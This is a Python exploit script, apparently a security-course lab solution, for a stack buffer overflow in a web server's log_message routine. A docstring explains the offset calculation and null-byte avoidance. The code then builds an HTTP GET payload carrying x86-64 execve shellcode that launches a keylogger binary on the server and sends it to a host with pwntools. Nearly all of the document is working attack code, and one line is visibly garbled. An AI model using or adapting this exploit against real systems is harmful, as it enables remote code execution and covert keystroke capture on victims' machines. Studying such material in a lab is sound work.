'''
!!!Copied solution from the github of Alicia Andries and Ruben Mechelinck for the base structure of this and further scenarios!!!

### FINDINGS ###
Buffer overflow inside log_message
Exploit this by executing shell code to run the keylogger binary which is inside the server_data folder already.
To execute this shell code we need to overwrite the return address of log_message with the address of the shell code.
We can easily calculate the offset to the return address of log_message because we know to size of the log buffer.
So in this buffer we have our payload which is the shell code and some prefixes and offsets.
Because we want the return address to be overwritten and point to the shell code, we need to calculate the offset to the return address.
This calculation we can do relative to the original rbp keeping the size, offset and prefixes of the log buffer in mind.
Next we want to place this new return address over the old one by doing a buffer overflow, 
the challenge however is to avoid null bytes in our payload. To do this we add padding after our shellcode to fill it fully up to the return address.
Another problem is that the server needs to know the name of the keylogger binary, so we need to add this to the payload too.
Next we can point to the keylogger name inside this log buffer too to execute it. 
Another difficulty is that argv and envp must be null. 
That why we add a placeholder to the payload which we can point to with rsi and rdx (argv and envp) and make this null in the shell code itself.
This way we don't sent null bytes in the payload but make it null afterwards.
Next we can just execute the shell code and run the keylogger binary.

### EXPLOIT SUMMARY ###
1. Copy the 'keylogger' binary to 'server_data'
2. Send a GET request that overflows the buffer 
3. The return address of log_message is overwritten with the address of the shell code
4. The shell code is executed to run the keylogger binary
5. Exploited
'''

from keystone import *
from pwn import *

### CONFIGS ###
host = "192.168.152.130"
port = 8080
original_rbp = 0x7ffff7ad1920 # the rbp value before the 'ret' instruction executed
log_buffer_rbp_offset = 0x450 # the log buffer starts at $original_rbp-0x450
log_buffer_prefix = 49 # the server already adds 49 bytes at start of the log buffer


# wait to copy the keylogger binary to the remote machine (allowed in scenario 1)
input("Copy the 'keylogger' binary to 'server_data'. Input anything to continue...")
message_prefix = b"GET /data.txt HTTP/1.1\r\n"
message_prefix_len = len(message_prefix)


### CREATE THE CRASH PAYLOAD ###
crash = message_prefix
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(crash) # extra 8 bytes to account for the caller's rbp
crash += b"q" * padding_size # add padding
crash += 0xffffffffffffffff.to_bytes(8, "little") # add new little endian return address
crash += b"\r\n\r\n"


### CREATE THE ATTACK PAYLOAD ###
keylogger = b"./keylogger"
placeholder = b"12345678"
keylogger_len = len(keylogger)
placeholder_len = len(placeholder)
# the offset of our injected payload wrt the current 'rsp' after 'ret' (required because of challenge 1)
# details: see stack representation at the bottom
payload_rsp_offset = 0x10 + log_buffer_rbp_offset - log_buffer_prefix - message_prefix_len
shell_code=f"""
  # Prepare the execve syscall
  lea rdi, [rsp-{payload_rsp_offset}] # ptr to injected "./keylogger"
  lea rsi, [rsp-{payload_rsp_offset - keylogger_len}] # argv: ptr to placeholder (future NULL ptr)
  lea rdx, [rsp-{payload_rsp_offset - keylogger_len}] # envp (= argv)

  xor rax, rax
  mov [rdx], rax

  mov al, 59
  syscall
"""

# assemble the shell code
ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, _ = ks.asm(shell_code)

# build the payload
sc1_exploit = message_prefix
sc1_exploit += keylogger + placeholder # add the argument datasc1_exploit += bytes(encoding0 # add assembled shell code
sc1_exploit += bytes(encoding) # add assembled shell code
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(sc1_exploit) # len includes the 24 bytes
sc1_exploit += b"q" * padding_size # add padding
retaddr = original_rbp - log_buffer_rbp_offset + log_buffer_prefix + message_prefix_len + keylogger_len + placeholder_len # the new (absolute) return address points to the first byte of the shell code
sc1_exploit += retaddr.to_bytes((retaddr.bit_length() + 7) // 8, byteorder = "little") # add new little endian return address without trailing null bytes
sc1_exploit += b"\r\n\r\n"

print(sc1_exploit)

### PERFORM ATTACK ###
#remote("localhost", port).send(crash) # send crash payload
# sleep(2)
remote(host, port).send(sc1_exploit) # send attack payload
